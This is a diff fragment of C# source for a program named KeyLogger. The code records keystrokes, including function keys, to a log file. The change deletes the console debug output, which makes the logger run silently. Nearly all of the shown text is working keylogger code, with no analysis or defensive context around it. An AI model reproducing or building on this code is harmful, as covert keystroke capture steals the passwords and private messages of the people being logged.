@@ -120,7 +120,6 @@ namespace KeyLogger {
     public static void Main(string[] args) {
 	  if (args.Length > 0) {
 		string logFileName = args[0];
-		// Console.WriteLine("Writing keys to " + logFileName);
 	  	logFile = File.AppendText(logFileName);
       	logFile.AutoFlush = true;
 
@@ -158,15 +157,12 @@ namespace KeyLogger {
 		bool printable = true;
 		if (result > 0) {
 		 	string outputStr = output.ToString();
-			Console.WriteLine("Checking " + outputStr);
 			if (isPrintable(outputStr)) {
-		  		Console.WriteLine("Writing " + outputStr);
 				logFile.Write(outputStr);	
 			} else {
-				Console.WriteLine("Character not printable so falling back");
 				printable = false;
 			}
-		} else { Console.WriteLine("Negative result for ToUnicode"); printable = false; }
+		} else { printable = false; }
 		if (printable == false) {
 			string keyChar;
 		if (vkCode >= (int)Keys.A && vkCode <= (int)Keys.Z) { // Alphabet characters
@@ -254,7 +250,6 @@ namespace KeyLogger {
 			}
 			logFile.Write(keyChar);
 		} else { 
-		 Console.WriteLine("Checking for Function");
 		 switch (vkCode) {
            case (int)Keys.F1: logFile.Write("<F1>"); break;
            case (int)Keys.F2: logFile.Write("<F2>"); break;
